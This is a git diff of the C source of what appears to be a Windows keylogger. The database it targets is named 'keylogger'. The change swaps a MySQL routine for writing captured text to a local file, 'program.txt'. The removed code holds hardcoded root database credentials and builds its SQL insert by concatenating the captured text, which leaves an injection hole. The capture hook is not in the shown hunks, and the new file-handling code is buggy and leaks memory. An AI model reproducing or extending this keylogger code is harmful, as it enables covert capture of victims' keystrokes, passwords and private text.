@@ -4,12 +4,14 @@
 #include <winuser.h>
 #include <stdbool.h>
 #include <string.h>
+#include <sys/stat.h>
 #include "mysql.h"
 #define SERVIDOR "localhost"
 #define USUARIO "root"
 #define SENHA "abzdwe123"
 #define BD "keylogger" 
 #define __STDC_WANT_LIB_EXT1__ 1
+#define ARQUIVO_DESTINO "program.txt"
 struct lista {
 	char* info;
 	size_t length;
@@ -19,29 +21,59 @@ struct lista {
 void log(struct lista*);
 struct lista* inserir(struct lista* lst, char* info);
 char* toString(struct lista* lst);
+char* lerTodoArquivo();
 
 void log(struct lista* lst) {
-	char* sql = (char*)malloc(sizeof(char) * 500);
-	strcpy(sql, "insert into logs (date,value) values (now(), \"");
 	char* texto = toString(lst);
-
-	strcat(sql, texto);
-	strcat(sql, "\")");
-	MYSQL conexao;
-	mysql_init(&conexao);
-	int res = 0;
-	if (mysql_real_connect(&conexao, SERVIDOR, USUARIO, SENHA, BD, 0, NULL, 0)) {
-		printf("Conexao bem sucedida\n");
-		res = mysql_query(&conexao, sql);
-		if (!res) {
-			printf("inseriu\n");
-		}
-		mysql_close(&conexao);
-	}
-	free(sql);
-	//free(texto);
-	//free(&conexao);
+	char* textoArquivo = lerTodoArquivo();
 	
+	int len = 0;
+	len = strlen(texto);
+	len += strlen(textoArquivo);
+
+	//cria uma string com um tamanho um pouco maior que as duas que serão concatenadas
+	char* teste = (char*)malloc((sizeof(char) * len) + sizeof(char) * 5);
+
+	strcpy(teste, textoArquivo);
+	strcat(teste, texto);
+	
+	int num;
+	FILE *fptr;
+
+	fptr = fopen(ARQUIVO_DESTINO, "w");
+
+	// exiting program 
+	if (fptr == NULL) {
+		printf("Error!");
+		exit(1);
+	}
+	fprintf(fptr, "%s", teste);
+	fclose(fptr);
+
+	//limpa a memoria
+	free(texto);
+	free(textoArquivo);
+	free(teste);
+}
+
+char* lerTodoArquivo() {
+	FILE *in_file = fopen(ARQUIVO_DESTINO, "r");
+	struct lista* lst = NULL;
+
+    struct stat sb;
+    stat(ARQUIVO_DESTINO, &sb);
+
+    char *file_contents = malloc(sb.st_size + (sizeof(char) * 5));
+
+    while (fscanf(in_file, "%[^\n] ", file_contents) != EOF) {
+        //printf("> %s\n", file_contents);
+		lst = inserir(lst, file_contents);
+    }
+
+    fclose(in_file);
+	char* retorno = toString(lst);
+	return retorno;
+    //exit(EXIT_SUCCESS);
 }
 
 int iniciaLog(char* argv[]) {
@@ -85,7 +117,7 @@ char* toString(struct lista* lst) {
 		aux = aux->prox;
 	}
 
-	char *retorno = (char*)malloc(sizeof(char) * tamanho);
+	char *retorno = (char*)malloc(sizeof(char) * tamanho + (sizeof(char) * 1));
 	int sizee = sizeof(char);
 	aux = lst;
 	int i = 0;
